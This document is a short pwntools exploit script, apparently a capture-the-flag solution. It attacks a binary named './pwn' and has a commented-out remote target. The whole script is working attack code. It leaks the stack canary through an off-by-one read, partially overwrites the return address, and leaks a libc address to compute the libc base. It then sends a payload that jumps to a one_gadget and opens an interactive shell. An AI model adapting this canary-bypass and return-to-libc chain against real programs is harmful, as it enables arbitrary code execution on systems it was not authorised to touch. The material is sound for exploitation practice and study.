from pwn import *
from LibcSearcher import *
# io = remote('124.156.121.112',28011)
io=process('./pwn')
elf = ELF('./pwn')
context.log_level = 'debug'

payload = b'A'*0x29
io.send(payload)
io.recvuntil(b'A'*0x28)
canary = u64(io.recv(8))-0x41
payload = b'a'*0x28 + p64(canary) + b'a'*0x18 + b'\x04'
#gdb.attach(io)
io.send(payload)

payload = b'a'*0x28 + b'a'*0x8 + b'a'*0x18
io.send(payload)
io.recvuntil(b'a'*0x48)
libc_start_main = u64(io.recv(6).ljust(8,b'\x00'))-240
libc = LibcSearcher('__libc_start_main',libc_start_main ) 
libc_base = libc_start_main - libc.dump('__libc_start_main')
#0x45216 one_gadget libc6_2.23-0ubuntu10_amd64.so
one_gedget = libc_base+0x45216
payload = b'a'*0x28 + p64(canary) + b'a'*0x18 + p64(one_gedget)
io.send(payload)
#gdb.attach(io)
io.interactive()
